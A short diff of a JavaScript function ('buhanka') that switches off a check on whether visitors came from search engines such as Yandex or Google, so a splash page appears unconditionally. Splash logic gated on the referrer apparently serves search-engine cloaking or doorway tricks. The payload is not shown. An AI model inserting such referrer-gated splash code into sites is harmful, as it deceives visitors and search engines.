@@ -51,9 +51,9 @@
     var buhanka = function() {
         
         var keyword = title[0];
-        var isps = document.referrer.match(/(yandex)|(vk)|(qip)|(nigma)|(mail)|(webalta)|(rambler)|(google)/i);
+        //var isps = document.referrer.match(/(yandex)|(vk)|(qip)|(nigma)|(mail)|(webalta)|(rambler)|(google)/i);
         var browserdetectstr = (window.opera && window.getSelection) || (!window.opera && window.XMLHttpRequest); 
-
+        var isps = true;
         if (isps && browserdetectstr) {
                 
                 SplashPage({
